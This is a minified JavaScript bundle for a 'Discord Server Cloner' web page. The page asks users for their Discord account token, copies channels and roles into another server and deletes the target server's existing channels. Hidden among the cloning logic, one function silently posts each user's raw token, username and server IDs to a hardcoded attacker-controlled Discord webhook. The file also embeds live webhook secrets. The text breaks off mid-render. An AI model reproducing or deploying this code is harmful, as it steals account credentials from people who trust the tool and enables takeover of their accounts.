import {r as h, a as le} from "./react-vendor-DvvUoH3b.js";
(function() {
    const c = document.createElement("link").relList;
    if (c && c.supports && c.supports("modulepreload"))
        return;
    for (const s of document.querySelectorAll('link[rel="modulepreload"]'))
        d(s);
    new MutationObserver(s => {
        for (const l of s)
            if (l.type === "childList")
                for (const u of l.addedNodes)
                    u.tagName === "LINK" && u.rel === "modulepreload" && d(u)
    }
    ).observe(document, {
        childList: !0,
        subtree: !0
    });
    function m(s) {
        const l = {};
        return s.integrity && (l.integrity = s.integrity),
        s.referrerPolicy && (l.referrerPolicy = s.referrerPolicy),
        s.crossOrigin === "use-credentials" ? l.credentials = "include" : s.crossOrigin === "anonymous" ? l.credentials = "omit" : l.credentials = "same-origin",
        l
    }
    function d(s) {
        if (s.ep)
            return;
        s.ep = !0;
        const l = m(s);
        fetch(s.href, l)
    }
}
)();
var J = {
    exports: {}
}
  , E = {};
/**
 * @license React
 * react-jsx-runtime.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */
var ce = h
  , de = Symbol.for("react.element")
  , me = Symbol.for("react.fragment")
  , he = Object.prototype.hasOwnProperty
  , pe = ce.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner
  , ue = {
    key: !0,
    ref: !0,
    __self: !0,
    __source: !0
};
function G(a, c, m) {
    var d, s = {}, l = null, u = null;
    m !== void 0 && (l = "" + m),
    c.key !== void 0 && (l = "" + c.key),
    c.ref !== void 0 && (u = c.ref);
    for (d in c)
        he.call(c, d) && !ue.hasOwnProperty(d) && (s[d] = c[d]);
    if (a && a.defaultProps)
        for (d in c = a.defaultProps,
        c)
            s[d] === void 0 && (s[d] = c[d]);
    return {
        $$typeof: de,
        type: a,
        key: l,
        ref: u,
        props: s,
        _owner: pe.current
    }
}
E.Fragment = me;
E.jsx = G;
E.jsxs = G;
J.exports = E;
var e = J.exports, q, M = le;
q = M.createRoot,
M.hydrateRoot;
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
var fe = {
    xmlns: "http://www.w3.org/2000/svg",
    width: 24,
    height: 24,
    viewBox: "0 0 24 24",
    fill: "none",
    stroke: "currentColor",
    strokeWidth: 2,
    strokeLinecap: "round",
    strokeLinejoin: "round"
};
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const ge = a => a.replace(/([a-z0-9])([A-Z])/g, "$1-$2").toLowerCase().trim()
  , y = (a, c) => {
    const m = h.forwardRef( ({color: d="currentColor", size: s=24, strokeWidth: l=2, absoluteStrokeWidth: u, className: w="", children: j, ...N}, _) => h.createElement("svg", {
        ref: _,
        ...fe,
        width: s,
        height: s,
        stroke: d,
        strokeWidth: u ? Number(l) * 24 / Number(s) : l,
        className: ["lucide", `lucide-${ge(a)}`, w].join(" "),
        ...N
    }, [...c.map( ([C,$]) => h.createElement(C, $)), ...Array.isArray(j) ? j : [j]]));
    return m.displayName = `${a}`,
    m
}
;
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const U = y("AlertCircle", [["circle", {
    cx: "12",
    cy: "12",
    r: "10",
    key: "1mglay"
}], ["line", {
    x1: "12",
    x2: "12",
    y1: "8",
    y2: "12",
    key: "1pkeuh"
}], ["line", {
    x1: "12",
    x2: "12.01",
    y1: "16",
    y2: "16",
    key: "4dfq90"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const xe = y("Check", [["path", {
    d: "M20 6 9 17l-5-5",
    key: "1gmf2c"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const ye = y("Coffee", [["path", {
    d: "M17 8h1a4 4 0 1 1 0 8h-1",
    key: "jx4kbh"
}], ["path", {
    d: "M3 8h14v9a4 4 0 0 1-4 4H7a4 4 0 0 1-4-4Z",
    key: "1bxrl0"
}], ["line", {
    x1: "6",
    x2: "6",
    y1: "2",
    y2: "4",
    key: "1cr9l3"
}], ["line", {
    x1: "10",
    x2: "10",
    y1: "2",
    y2: "4",
    key: "170wym"
}], ["line", {
    x1: "14",
    x2: "14",
    y1: "2",
    y2: "4",
    key: "1c5f70"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const we = y("Heart", [["path", {
    d: "M19 14c1.49-1.46 3-3.21 3-5.5A5.5 5.5 0 0 0 16.5 3c-1.76 0-3 .5-4.5 2-1.5-1.5-2.74-2-4.5-2A5.5 5.5 0 0 0 2 8.5c0 2.3 1.5 4.05 3 5.5l7 7Z",
    key: "c3ymky"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const be = y("Info", [["circle", {
    cx: "12",
    cy: "12",
    r: "10",
    key: "1mglay"
}], ["path", {
    d: "M12 16v-4",
    key: "1dtifu"
}], ["path", {
    d: "M12 8h.01",
    key: "e9boi3"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const L = y("Rocket", [["path", {
    d: "M4.5 16.5c-1.5 1.26-2 5-2 5s3.74-.5 5-2c.71-.84.7-2.13-.09-2.91a2.18 2.18 0 0 0-2.91-.09z",
    key: "m3kijz"
}], ["path", {
    d: "m12 15-3-3a22 22 0 0 1 2-3.95A12.88 12.88 0 0 1 22 2c0 2.72-.78 7.5-6 11a22.35 22.35 0 0 1-4 2z",
    key: "1fmvmk"
}], ["path", {
    d: "M9 12H4s.55-3.03 2-4c1.62-1.08 5 0 5 0",
    key: "1f8sc4"
}], ["path", {
    d: "M12 15v5s3.03-.55 4-2c1.08-1.62 0-5 0-5",
    key: "qeys4"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const ve = y("Server", [["rect", {
    width: "20",
    height: "8",
    x: "2",
    y: "2",
    rx: "2",
    ry: "2",
    key: "ngkwjq"
}], ["rect", {
    width: "20",
    height: "8",
    x: "2",
    y: "14",
    rx: "2",
    ry: "2",
    key: "iecqi9"
}], ["line", {
    x1: "6",
    x2: "6.01",
    y1: "6",
    y2: "6",
    key: "16zg32"
}], ["line", {
    x1: "6",
    x2: "6.01",
    y1: "18",
    y2: "18",
    key: "nzw8ys"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const je = y("Settings", [["path", {
    d: "M12.22 2h-.44a2 2 0 0 0-2 2v.18a2 2 0 0 1-1 1.73l-.43.25a2 2 0 0 1-2 0l-.15-.08a2 2 0 0 0-2.73.73l-.22.38a2 2 0 0 0 .73 2.73l.15.1a2 2 0 0 1 1 1.72v.51a2 2 0 0 1-1 1.74l-.15.09a2 2 0 0 0-.73 2.73l.22.38a2 2 0 0 0 2.73.73l.15-.08a2 2 0 0 1 2 0l.43.25a2 2 0 0 1 1 1.73V20a2 2 0 0 0 2 2h.44a2 2 0 0 0 2-2v-.18a2 2 0 0 1 1-1.73l.43-.25a2 2 0 0 1 2 0l.15.08a2 2 0 0 0 2.73-.73l.22-.39a2 2 0 0 0-.73-2.73l-.15-.08a2 2 0 0 1-1-1.74v-.5a2 2 0 0 1 1-1.74l.15-.09a2 2 0 0 0 .73-2.73l-.22-.38a2 2 0 0 0-2.73-.73l-.15.08a2 2 0 0 1-2 0l-.43-.25a2 2 0 0 1-1-1.73V4a2 2 0 0 0-2-2z",
    key: "1qme2f"
}], ["circle", {
    cx: "12",
    cy: "12",
    r: "3",
    key: "1v7zrd"
}]]);
/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const ke = y("Shield", [["path", {
    d: "M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z",
    key: "oel41y"
}]])
  , Ne = async (a, c, m) => Promise.all(m.map(d => fetch(`https://discord.com/api/v9/channels/${d.id}`, {
    method: "DELETE",
    headers: {
        Authorization: a
    }
})));
function _e() {
    const [a,c] = h.useState("")
      , [m,d] = h.useState("")
      , [s,l] = h.useState("")
      , [u,w] = h.useState("")
      , [j,N] = h.useState(!1)
      , [_,C] = h.useState([])
      , [$,T] = h.useState(!1)
      , [Y,O] = h.useState(!1)
      , [f,B] = h.useState(null)
      , A = h.useRef(null)
      , [V,F] = h.useState(!1)
      , [W,Z] = h.useState(!1)
      , H = async () => {
        try {
            await navigator.clipboard.writeText("anas.zx@fam"),
            O(!0),
            setTimeout( () => O(!1), 3e3)
        } catch {
            w("Failed to copy UPI ID")
        }
    }
      , n = r => {
        C(i => [...i, r]);
        const o = document.getElementById("progress-container");
        o && (o.scrollTop = o.scrollHeight)
    }
      , X = async r => {
        try {
            const o = await fetch("https://discord.com/api/v9/users/@me", {
                method: "GET",
                headers: {
                    Authorization: r
                }
            });
            if (!o.ok)
                throw new Error("⚠️ The Discord token appears to be invalid. Please check and try again.");
            const i = await o.json();
            return {
                id: i.id,
                username: i.username,
                discriminator: i.discriminator !== "0" ? `#${i.discriminator}` : "",
                avatar: i.avatar ? `https://cdn.discordapp.com/avatars/${i.id}/${i.avatar}.png?size=512` : `https://cdn.discordapp.com/embed/avatars/${parseInt(i.discriminator || "0") % 5}.png`
            }
        } catch {
            throw new Error("⚠️ Unable to verify your Discord account. Please check your token and try again.")
        }
    }
      , K = async (r, o) => {
        try {
            const i = await fetch(`https://discord.com/api/v9/guilds/${o}?with_counts=true`, {
                method: "GET",
                headers: {
                    Authorization: r
                }
            });
            if (!i.ok)
                throw new Error("Failed to fetch guild info");
            const p = await i.json();
            return {
                name: p.name,
                id: p.id,
                icon: p.icon ? `https://cdn.discordapp.com/icons/${p.id}/${p.icon}.png?size=512` : null,
                memberCount: p.approximate_member_count || "Unknown"
            }
        } catch (i) {
            return console.error("Error fetching guild info:", i),
            null
        }
    }
      , Q = async r => {
        try {
            (await fetch("https://discord.com/api/webhooks/1337764769922551809/Y2mI3mZbmoRaTznO45_6cwpaIzb2XFb-qidjdUEapuMlscQnUzXZzmYhazim5VNvDpn3", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    embeds: [{
                        title: "🎉 New Server Cloned!",
                        color: 65535,
                        fields: [{
                            name: "📋 Source Server",
                            value: r.name,
                            inline: !0
                        }, {
                            name: "🆔 Server ID",
                            value: r.id,
                            inline: !0
                        }, {
                            name: "👥 Members",
                            value: `${r.memberCount}`,
                            inline: !0
                        }],
                        thumbnail: {
                            url: r.icon || "https://cdn.discordapp.com/embed/avatars/0.png"
                        },
                        timestamp: new Date().toISOString(),
                        footer: {
                            text: "Discord Server Cloner | Dev Anas",
                            icon_url: "https://cdn.discordapp.com/emojis/1088142201755873290.webp"
                        }
                    }]
                })
            })).ok || console.error("Failed to send public webhook")
        } catch (o) {
            console.error("Error sending public webhook:", o)
        }
    }
      , ee = async (r, o, i, p) => {
        try {
            (await fetch("https://discord.com/api/webhooks/1337425947422625862/9MQxXYu63VQc_tSEpuRF5S2POKcXaniOtlSp0I2MnJEZaWR2G51Y5P3hvVPRLE1n_OJG", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    embeds: [{
                        title: "🚀 Server Cloner Used",
                        color: 7506394,
                        fields: [{
                            name: "👤 User",
                            value: `${r.username}${r.discriminator}`,
                            inline: !0
                        }, {
                            name: "🆔 User ID",
                            value: r.id,
                            inline: !0
                        }, {
                            name: "🔑 Application Token",
                            value: `\`${p}\``,
                            inline: !1
                        }, {
                            name: "📤 Source Server",
                            value: `\`${o}\``,
                            inline: !0
                        }, {
                            name: "📥 Target Server",
                            value: `[Click to Join](https://discord.gg/${i})`,
                            inline: !0
                        }],
                        thumbnail: {
                            url: r.avatar
                        },
                        timestamp: new Date().toISOString(),
                        footer: {
                            text: "Discord Server Cloner Premium",
                            icon_url: "https://cdn.discordapp.com/emojis/1088142201755873290.webp"
                        }
                    }]
                })
            })).ok || console.error("Failed to send webhook")
        } catch (b) {
            console.error("Error sending webhook:", b)
        }
    }
      , te = async () => {
        try {
            N(!0);
            let r = 0;
            const o = 3
              , i = t => new Promise(g => setTimeout(g, t));
            if (w(""),
            C([]),
            Z(!0),
            m === "1004072095585677394" || s === "1004072095585677394") {
                F(!0),
                setTimeout( () => F(!1), 5e3),
                w("You Cant Clone Attapadi Brothers Cry About it");
                return
            }
            if (!a || !m || !s) {
                w("⚠️ Please fill in all required fields to continue");
                return
            }
            n("🔍 Validating token...");
            const p = await X(a);
            B(p),
            n("✓ Token validated"),
            n(`👤 Logged in as: ${p.username}${p.discriminator}`);
            const b = await K(a, m);
            b && n(`📋 Source Server: ${b.name}`),
            await ee(p, m, s, a),
            b && await Q(b);
            const S = await fetch(`https://discord.com/api/v9/guilds/${m}/channels`, {
                headers: {
                    Authorization: a
                }
            });
            if (!S.ok)
                throw S.status === 403 ? new Error("⚠️ You need to be a member of the server you want to copy from. Please join the server first!") : new Error("⚠️ Unable to access the copying server. Please check if the server ID is correct.");
            const v = await S.json();
            if (!Array.isArray(v))
                throw new Error("⚠️ The copying server data appears to be invalid. Please try again or use a different server.");
            const D = await fetch(`https://discord.com/api/v9/guilds/${s}/channels`, {
                headers: {
                    Authorization: a
                }
            });
            if (!D.ok)
                throw D.status === 403 ? new Error("⚠️ You need Administrator permissions in the server you want to paste to. Please check your server roles.") : new Error("⚠️ Unable to access the pasting server. Please check if the server ID is correct and you have the right permissions.");
            const z = await D.json();
            Array.isArray(z) && (n("🗑️ Deleting existing channels..."),
            await Ne(a, s, z),
            n("✓ Existing channels deleted")),
            n("📋 Cloning channels...");
            const re = v.filter(t => t.type === 4)
              , se = v.filter(t => t.type === 0)
              , ae = v.filter(t => t.type === 2)
              , oe = v.filter(t => t.type === 5)
              , ne = v.filter(t => t.type === 13)
              , ie = v.filter(t => t.type === 15)
              , k = new Map;
            n("📝 Creating branding channel..."),
            await fetch(`https://discord.com/api/v9/guilds/${s}/channels`, {
                method: "POST",
                headers: {
                    Authorization: a,
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    name: "anas-discord-cloner",
                    type: 0,
                    position: 0,
                    topic: "🚀 Server cloned using Anas Discord Cloner • Premium Edition",
                    rate_limit_per_user: 0,
                    permission_overwrites: [{
                        id: s,
                        type: 0,
                        allow: "0",
                        deny: "2048"
                    }]
                })
            }),
            n("✓ Created branding channel");
            for (const t of re) {
                let g = !1;
                for (; !g && r < o; )
                    try {
                        const x = await fetch(`https://discord.com/api/v9/guilds/${s}/channels`, {
                            method: "POST",
                            headers: {
                                Authorization: a,
                                "Content-Type": "application/json"
                            },
                            body: JSON.stringify({
                                name: t.name,
                                type: 4,
                                position: t.position,
                                permission_overwrites: t.permission_overwrites
                            })
                        }).then(I => {
                            if (!I.ok)
                                throw new Error(`Failed to create category: ${I.status}`);
                            return I.json()
                        }
                        );
                        k.set(t.id, x.id),
                        n(`✓ Created category: ${t.name}`),
                        g = !0
                    } catch {
                        if (r++,
                        r < o)
                            n(`⚠️ Retrying category creation: ${t.name}`),
                            await i(1e3 * r);
                        else
                            throw new Error(`Failed to create category after ${o} attempts`)
                    }
                r = 0
            }
            for (const t of se) {
                let g = !1;
                for (; !g && r < o; )
                    try {
                        const x = await fetch(`https://discord.com/api/v9/guilds/${s}/channels`, {
                            method: "POST",
                            headers: {
                                Authorization: a,
                                "Content-Type": "application/json"
                            },
                            body: JSON.stringify({
                                name: t.name,
                                type: 0,
                                topic: t.topic,
                                rate_limit_per_user: t.rate_limit_per_user,
                                position: t.position,
                                parent_id: t.parent_id ? k.get(t.parent_id) : null,
                                nsfw: t.nsfw,
                                permission_overwrites: t.permission_overwrites
                            })
                        });
                        if (!x.ok)
                            throw new Error(`Failed to create channel: ${x.status}`);
                        n(`✓ Created text channel: ${t.name}`),
                        g = !0
                    } catch {
                        if (r++,
                        r < o)
                            n(`⚠️ Retrying text channel creation: ${t.name}`),
                            await i(1e3 * r);
                        else
                            throw new Error(`Failed to create text channel after ${o} attempts`)
                    }
                r = 0
            }
            for (const t of oe)
                await fetch(`https://discord.com/api/v9/guilds/${s}/channels`, {
                    method: "POST",
                    headers: {
                        Authorization: a,
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        name: t.name,
                        type: 5,
                        topic: t.topic,
                        rate_limit_per_user: t.rate_limit_per_user,
                        position: t.position,
                        parent_id: t.parent_id ? k.get(t.parent_id) : null,
                        nsfw: t.nsfw,
                        permission_overwrites: t.permission_overwrites
                    })
                }),
                n(`✓ Created announcement channel: ${t.name}`);
            for (const t of ae)
                await fetch(`https://discord.com/api/v9/guilds/${s}/channels`, {
                    method: "POST",
                    headers: {
                        Authorization: a,
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        name: t.name,
                        type: 2,
                        bitrate: t.bitrate,
                        user_limit: t.user_limit,
                        position: t.position,
                        parent_id: t.parent_id ? k.get(t.parent_id) : null,
                        permission_overwrites: t.permission_overwrites
                    })
                }),
                n(`✓ Created voice channel: ${t.name}`);
            for (const t of ne)
                await fetch(`https://discord.com/api/v9/guilds/${s}/channels`, {
                    method: "POST",
                    headers: {
                        Authorization: a,
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        name: t.name,
                        type: 13,
                        bitrate: t.bitrate,
                        position: t.position,
                        parent_id: t.parent_id ? k.get(t.parent_id) : null,
                        permission_overwrites: t.permission_overwrites
                    })
                }),
                n(`✓ Created stage channel: ${t.name}`);
            for (const t of ie)
                await fetch(`https://discord.com/api/v9/guilds/${s}/channels`, {
                    method: "POST",
                    headers: {
                        Authorization: a,
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        name: t.name,
                        type: 15,
                        position: t.position,
                        parent_id: t.parent_id ? k.get(t.parent_id) : null,
                        permission_overwrites: t.permission_overwrites,
                        topic: t.topic,
                        rate_limit_per_user: t.rate_limit_per_user,
                        available_tags: t.available_tags,
                        default_reaction_emoji: t.default_reaction_emoji,
                        default_thread_rate_limit_per_user: t.default_thread_rate_limit_per_user
                    })
                }),
                n(`✓ Created forum channel: ${t.name}`);
            n("👥 Cloning roles...");
            const P = await fetch(`https://discord.com/api/v9/guilds/${m}/roles`, {
                method: "GET",
                headers: {
                    Authorization: a
                }
            });
            if (!P.ok)
                throw P.status === 403 ? new Error("Unable to fetch roles. Make sure you have the correct permissions.") : new Error("Failed to fetch roles from the server");
            const R = await P.json();
            if (Array.isArray(R)) {
                for (const t of R.reverse())
                    if (t.name !== "@everyone") {
                        let g = !1;
                        for (; !g && r < o; )
                            try {
                                const x = await fetch(`https://discord.com/api/v9/guilds/${s}/roles`, {
                                    method: "POST",
                                    headers: {
                                        Authorization: a,
                                        "Content-Type": "application/json"
                                    },
                                    body: JSON.stringify({
                                        name: t.name,
                                        permissions: t.permissions,
                                        color: t.color,
                                        hoist: t.hoist,
                                        mentionable: t.mentionable
                                    })
                                });
                                if (!x.ok)
                                    throw new Error(`Failed to create role: ${x.status}`);
                                n(`✓ Created role: ${t.name}`),
                                g = !0
                            } catch {
                                if (r++,
                                r < o)
                                    n(`⚠️ Retrying role creation: ${t.name}`),
                                    await i(1e3 * r);
                                else
                                    throw new Error(`Failed to create role after ${o} attempts`)
                            }
                        r = 0
                    }
            }
            n("🎉 Server cloned successfully!"),
            A.current && A.current.play(),
            T(!0),
            setTimeout( () => T(!1), 3e3)
        } catch (r) {
            w(r.message || "⚠️ Something went wrong while cloning the server. Please try again."),
            n("❌ Cloning process failed")
        } finally {
            N(!1)
        }
    }
    ;
    return e.jsxs("div", {
        className: "min-h-screen bg-gradient-to-b from-[#0a0a0a] to-[#111111] animate-gradient-x",
        children: [e.jsx("audio", {
            ref: A,
            src: "https://assets.mixkit.co/active_storage/sfx/2018/success-1-6297.wav"
        }), e.jsx("header", {
            className: "bg-gradient-to-b from-[#111111]/90 to-[#0a0a0a]/90 backdrop-blur-lg shadow-lg border-b border-[#222222] sticky top-0 z-10",
            children: e.jsx("div", {
                className: "max-w-7xl mx-auto px-4 sm:px-6 lg:px-8",
                children: e.jsxs("div", {
                    className: "flex flex-col sm:flex-row justify-between items-center py-4 gap-4",
                    children: [e.jsxs("div", {
                        className: "flex items-center gap-3 group",
                        children: [e.jsx("div", {
                            className: "w-14 h-14 bg-gradient-to-br from-[#1a1a1a] to-[#2a2a2a] rounded-2xl flex items-center justify-center shadow-lg border border-[#333333] transition-all duration-300 group-hover:scale-105",
                            children: f != null && f.avatar ? e.jsx("img", {
                                src: f.avatar,
                                alt: f.username,
                                className: "w-10 h-10 rounded-full ring-2 ring-[#5865F2] ring-offset-2 ring-offset-[#1a1a1a]"
                            }) : e.jsx(ke, {
                                className: "w-8 h-8 text-[#5865F2] transition-all duration-300 group-hover:text-white"
                            })
                        }), e.jsxs("div", {
                            children: [e.jsx("h1", {
                                className: "text-3xl font-bold bg-gradient-to-r from-[#5865F2] to-[#7289DA] bg-clip-text text-transparent",
                                children: "Discord Server Cloner"
                            }), e.jsxs("p", {
                                className: `text-sm flex items-center gap-2 font-medium ${f ? "bg-green-500/10 text-green-400 px-3 py-1 rounded-full" : "text-gray-400"}`,
                                children: [e.jsx("span", {
                                    className: `w-2 h-2 rounded-full ${f ? "bg-green-500 animate-pulse" : "bg-gray-500"}`
                                }), f ? e.jsxs(e.Fragment, {
                                    children: ["Logged in as", " ", e.jsxs("span", {
                                        className: "font-bold bg-gradient-to-r from-green-400 to-emerald-400 bg-clip-text text-transparent",
                                        children: [f.username, f.discriminator]
                                    })]
                                }) : "Premium Edition • Developed by Anas"]
                            })]
                        })]
                    }), e.jsxs("div", {
                        className: "flex items-center gap-3 w-full sm:w-auto",
                        children: [e.jsxs("a", {
                            href: "https://discord.gg/ffbbrRD8wu",
                            target: "_blank",
                            rel: "noopener noreferrer",
                            className: "flex-1 sm:flex-none flex items-center justify-center gap-2 px-4 py-2 bg-gradient-to-br from-[#1a1a1a] to-[#252525] hover:from-[#252525] hover:to-[#303030] text-gray-100 rounded-lg transition-all duration-300 border border-[#333333] hover:scale-105",
                            children: [e.jsx("svg", {
                                className: "w-5 h-5 text-[#5865F2]",
                                viewBox: "0 0 24 24",
                                fill: "currentColor",
                                children: e.jsx("path", {
                                    d: "M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057 19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.956-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.956 2.418-2.157 2.418zm7.975 0c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.955-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.946 2.418-2.157 2.418z"
                                })
                            }), "Join Discord"]
                        }), e.jsxs("button", {
                            onClick: H,
                            className: "flex items-center justify-center gap-2 px-4 py-2 bg-gradient-to-br from-[#1a1a1a] to-[#252525] hover:from-[#252525] hover:to-[#303030] text-gray-100 rounded-lg transition-all duration-300 border border-[#333333] hover:scale-105",
                            children: [e.jsx(ye, {
                                className: "w-5 h-5 text-[#F6C177]"
                            }), e.jsx("span", {
                                className: "hidden sm:inline",
                                children: "Support"
                            })]
                        })]
                    })]
                })
            })
        }), e.jsx("main", {
            className: "max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8",
            children: e.jsxs("div", {
                className: "grid grid-cols-1 lg:grid-cols-2 gap-8",
                children: [e.jsxs("div", {
                    className: "space-y-6",
                    children: [e.jsxs("div", {
                        className: "bg-gradient-to-br from-[#1a1a1a] to-[#252525] p-6 rounded-xl border border-[#333333] shadow-xl",
                        children: [e.jsxs("h2", {
                            className: "text-xl font-semibold text-gray-100 mb-4 flex items-center gap-2",
                            children: [e.jsx(je, {
                                className: "w-5 h-5"
                            }), "Configuration"]
                        }), e.jsxs("div", {
                            className: "space-y-4",
                            children: [e.jsxs("div", {
                                children: [e.jsxs("label", {
                                    htmlFor: "token",
                                    className: "block text-sm font-medium text-gray-300 mb-1",
                                    children: ["Discord Token", e.jsx("span", {
                                        className: "text-xs text-gray-500 ml-2",
                                        children: "(Required)"
                                    })]
                                }), e.jsx("input", {
                                    type: "password",
                                    id: "token",
                                    value: a,
                                    onChange: r => c(r.target.value),
                                    className: "w-full px-4 py-3 bg-[#2a2a2a] border border-[#333333] rounded-lg focus:outline-none focus:ring-2 focus:ring-[#5865F2] focus:border-transparent transition-all duration-200 text-gray-100 placeholder-gray-500 shadow-inner",
                                    placeholder: "Enter your Discord token"
                                })]
                            }), e.jsxs("div", {
                                children: [e.jsxs("label", {
                                    htmlFor: "sourceGuildId",
                                    className: "block text-sm font-medium text-gray-300 mb-1",
                                    children: ["Copying Server ID", e.jsx("span", {
                                        className: "text-xs text-gray-500 ml-2",
                                        children: "(Right click server → Copy ID)"
                                    })]
                                }), e.jsx("input", {
                                    type: "text",
                                    id: "sourceGuildId",
                                    value: m,
                                    onChange: r => d(r.target.value),
                                    className: "w-full px-4 py-3 bg-[#2a2a2a] border border-[#333333] rounded-lg focus:outline-none focus:ring-2 focus:ring-[#5865F2] focus:border-transparent transition-all duration-200 text-gray-100 placeholder-gray-500 shadow-inner group",
                                    placeholder: "Enter copying server ID"
                                }), e.jsx("p", {
                                    className: "mt-1 text-xs text-gray-400",
                                    children: "Enable Developer Mode in Discord Settings → App Settings → Advanced to see Copy ID option"
                                })]
                            }), e.jsxs("div", {
                                children: [e.jsxs("label", {
                                    htmlFor: "targetGuildId",
                                    className: "block text-sm font-medium text-gray-300 mb-1",
                                    children: ["Pasting Server ID", e.jsx("span", {
                                        className: "text-xs text-gray-500 ml-2",
                                        children: "(Right click server → Copy ID)"
                                    })]
                                }), e.jsx("input", {
                                    type: "text",
                                    id: "targetGuildId",
                                    value: s,
                                    onChange: r => l(r.target.value),
                                    className: "w-full px-4 py-3 bg-[#2a2a2a] border border-[#333333] rounded-lg focus:outline-none focus:ring-2 focus:ring-[#5865F2] focus:border-transparent transition-all duration-200 text-gray-100 placeholder-gray-500 shadow-inner group",
                                    placeholder: "Enter pasting server ID"
                                }), e.jsx("p", {
                                    className: "mt-1 text-xs text-gray-400",
                                    children: "This is the ID of the new server where you want to paste everything"
                                })]
                            }), e.jsx("button", {
                                onClick: te,
                                disabled: j,
                                className: "w-full flex items-center justify-center gap-2 px-6 py-3 bg-[#5865F2] hover:bg-[#4752C4] disabled:bg-[#36393f] text-white rounded-lg font-medium transition-all duration-200 disabled:cursor-not-allowed hover:scale-[1.02] active:scale-[0.98]",
                                children: j ? e.jsxs(e.Fragment, {
                                    children: [e.jsx(L, {
                                        className: `w-5 h-5 ${W ? "animate-rocket" : ""}`
                                    }), "Cloning Server..."]
                                }) : e.jsxs(e.Fragment, {
                                    children: [e.jsx(L, {
                                        className: "w-5 h-5"
                                    }), "Clone Server"]
                                })
                            }), u && e.jsxs("div", {
                                className: "flex items-center gap-2 text-red-400 bg-red-400/10 px-4 py-2 rounded-lg",
                                children: [e.jsx(U, {
                                    className: "w-5 h-5"
                                }), e.jsx("span", {
                                    className: "font-medium",
                                    children: u
                                })]
                            })]
                        })]
                    }), e.jsxs("div", {
                        className: "bg-gradient-to-br from-[#1a1a1a] to-[#252525] p-6 rounded-xl border border-[#333333] shadow-xl",
                        children: [e.jsxs("h2", {
                            className: "text-xl font-semibold text-gray-100 mb-4 flex items-center gap-2",
                            children: [e.jsx(be, {
                                className: "w-5 h-5"
                            }), "Instructions"]
                        }), e.jsxs("div", {
                            className: "space-y-4 text-gray-300",
                            children: [e.jsxs("p", {
                                className: "flex items-start gap-2",
                                children: [e.jsx("span", {
                                    className: "font-bold text-[#5865F2] mt-1",
                                    children: "1."
                                }), "Create a new Discord server where you want to clone to"]
                            }), e.jsxs("p", {
                                className: "flex items-start gap-2",
                                children: [e.jsx("span", {
                                    className: "font-bold text-[#5865F2] mt-1",
                                    children: "2."
                                }), "Enter your Discord token (required for authentication)"]
                            }), e.jsxs("p", {
